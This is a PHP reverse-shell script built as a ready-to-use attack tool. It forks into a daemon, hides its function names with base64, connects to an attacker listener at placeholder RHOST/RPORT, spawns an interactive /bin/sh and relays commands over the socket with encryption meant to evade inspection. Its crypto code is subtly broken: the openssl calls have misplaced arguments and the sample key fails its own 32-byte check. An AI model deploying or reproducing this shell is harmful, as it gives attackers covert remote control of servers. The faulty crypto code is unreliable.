<?php
/** 
 * Author : J4ck3LSyN
 * Version: 0.5.0
 * */ 
@set_time_limit(0);
@ignore_user_abort(true);
class ReverseShell {
    // --- Configuration ---
    private $__ip = '{RHOST}';               // Replace with your listener IP
    private $__port = {RPORT};               // Replace with your listener port
    private $__chunk_size = 1400;
    private $__shell_cmd = 'L2Jpbi9zaCAtaQ=='; // base64('/bin/sh -i')
    private $__use_encryption = true;
    private $__encryption_key = 'your_super_secret_32_byte_key!!'; // Must be exactly 32 bytes
    // --- End Configuration ---

    private $__daemon = false;
    private $__sock;
    private $__pipes = [];
    // Obfuscated function map (base64-encoded function names)
    private $__funcs = [
        'pcntl_fork'         => 'cGNudGxfZm9yaw==',
        'posix_setsid'       => 'cG9zaXhfc2V0c2lk',
        'fsockopen'          => 'ZnNvY2tvcGVu',
        'proc_open'          => 'cHJvY19vcGVu',
        'stream_select'      => 'c3RyZWFtX3NlbGVjdA==',
        'stream_set_blocking' => 'c3RyZWFtX3NldF9ibG9ja2luZw==',
        'base64_decode'      => 'YmFzZTY0X2RlY29kZQ==',
        'openssl_encrypt'    => 'b3BlbnNzbF9lbmNyeXB0',
        'openssl_decrypt'    => 'b3BlbnNzbF9kZWNyeXB0',
        'random_bytes'       => 'cmFuZG9tX2J5dGVz',
        'proc_close'         => 'cHJvY19jbG9zZQ==',
    ];
    public function run() {
        $this->_fork();
        @chdir('/');
        @umask(0);
        // Open socket connection
        $this->__sock = $this->_f('fsockopen', $this->__ip, $this->__port, $errno, $errstr, 30);
        if (!$this->__sock) {
            $this->_log("Error: {$errstr} ({$errno})");
            return;
        }
        // Spawn shell process
        $descriptors = [
            0 => ['pipe', 'r'], // stdin
            1 => ['pipe', 'w'], // stdout
            2 => ['pipe', 'w'], // stderr
        ];
        $process = $this->_f('proc_open', $this->b64d($this->__shell_cmd), $descriptors, $this->__pipes);
        if (!is_resource($process)) {
            $this->_log("Error: Failed to spawn shell.");
            return;
        }
        // Set non-blocking mode on all streams
        $this->_f('stream_set_blocking', $this->__pipes[0], 0);
        $this->_f('stream_set_blocking', $this->__pipes[1], 0);
        $this->_f('stream_set_blocking', $this->__pipes[2], 0);
        $this->_f('stream_set_blocking', $this->__sock, 0);
        $this->_log("Success: Reverse shell connected to {$this->__ip}:{$this->__port}");
        // Main loop
        while (true) {
            if (feof($this->__sock) || !is_resource($this->__sock)) {
                $this->_log("Error: Shell connection terminated.");
                break;
            }
            if (feof($this->__pipes[1]) && feof($this->__pipes[2])) {
                $this->_log("Error: Shell process terminated.");
                break;
            }
            $read = [$this->__sock, $this->__pipes[1], $this->__pipes[2]];
            $write = null;
            $except = null;
            $changed_streams = $this->_f('stream_select', $read, $write, $except, null);
            if ($changed_streams === false) {
                $this->_log("Error: stream_select failed.");
                break;
            }
            // Receive input from attacker → send to shell
            if (in_array($this->__sock, $read)) {
                $input = fread($this->__sock, $this->__chunk_size);
                $decrypted = $this->_decrypt($input);
                if ($decrypted !== false && strlen($decrypted) > 0) {
                    fwrite($this->__pipes[0], $decrypted);
                }
            }
            // Send stdout back
            if (in_array($this->__pipes[1], $read)) {
                $output = fread($this->__pipes[1], $this->__chunk_size);
                if (strlen($output) > 0) {
                    $encrypted = $this->_encrypt($output);
                    @fwrite($this->__sock, $encrypted);
                }
            }
            // Send stderr back
            if (in_array($this->__pipes[2], $read)) {
                $output = fread($this->__pipes[2], $this->__chunk_size);
                if (strlen($output) > 0) {
                    $encrypted = $this->_encrypt($output);
                    @fwrite($this->__sock, $encrypted);
                }
            }
        }
        $this->cleanup($process);
    }

    private function _fork() {
        // Fork only if pcntl is available
        $pid = $this->_f('pcntl_fork');
        if ($pid === -1) {
            $this->_log("Info: Fork failed or not supported. Running in foreground.");
            return;
        }

        if ($pid > 0) {
            exit(0); // Parent exits
        }

        // Child continues
        $sid = $this->_f('posix_setsid');
        if ($sid === -1) {
            $this->_log("Error: Could not become session leader.");
            exit(1);
        }

        $this->__daemon = true;
        $this->_log("Info: Process daemonized.");
    }

    private function _f($name, ...$args) {
        if (!isset($this->__funcs[$name])) {
            return false;
        }

        $func = $this->b64d($this->__funcs[$name]);
        if (function_exists($func)) {
            return $func(...$args);
        }

        return false;
    }

    private function b64d($str) {
        return base64_decode($str);
    }

    private function _encrypt($data) {
        if (!$this->__use_encryption) {
            return $data;
        }

        if (strlen($this->__encryption_key) !== 32) {
            $this->_log("Error: Encryption key must be 32 bytes.");
            exit(1);
        }

        $iv = $this->_f('random_bytes', 12); // GCM mode requires 12-byte IV
        $tag = '';
        $encrypted = $this->_f('openssl_encrypt', $data, 'aes-256-gcm', OPENSSL_RAW_DATA, $iv, $tag, '', 16);
        if ($encrypted === false) {
            return false;
        }

        return $iv . $tag . $encrypted; // Prepend IV + tag for decryption
    }

    private function _decrypt($data) {
        if (!$this->__use_encryption || strlen($data) < 28) {
            return $data;
        }

        $iv = substr($data, 0, 12);
        $tag = substr($data, 12, 16);
        $ciphertext = substr($data, 28);

        if (strlen($iv) !== 12 || strlen($tag) !== 16) {
            return false;
        }

        $decrypted = $this->_f('openssl_decrypt', $ciphertext, 'aes-256-gcm', OPENSSL_RAW_DATA, $iv, $tag, $this->__encryption_key);

        return $decrypted === false ? '' : $decrypted;
    }

    private function _log($message) {
        if (!$this->__daemon) {
            echo $message . "\n";
        }
    }

    private function cleanup($process) {
        @fclose($this->__sock);
        foreach ($this->__pipes as $pipe) {
            @fclose($pipe);
        }
        @proc_close($process);
    }
}

// Start the reverse shell
(new ReverseShell())->run();

?>
